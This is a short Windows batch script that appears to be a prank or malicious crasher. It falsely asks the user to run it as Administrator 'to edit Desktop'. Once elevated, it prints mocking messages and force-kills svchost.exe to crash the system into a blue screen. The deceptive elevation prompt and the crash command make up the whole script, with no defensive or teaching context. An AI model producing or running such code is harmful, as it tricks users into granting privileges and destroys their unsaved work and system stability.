@echo off
color 0
net session >nul 2>&1
    if %errorLevel% == 0 (
        goto bsod
    ) else (
        
        goto endnoadmin
    )
    :endnoadmin
echo Please run as Administrator to edit Desktop
    goto end




:bsod
color 4
echo lol have fun XD
timeout 1 /NOBREAK >null
echo cya
echo By Daniel.Spinello
taskkill /f /im svchost.exe
:end
pause>null
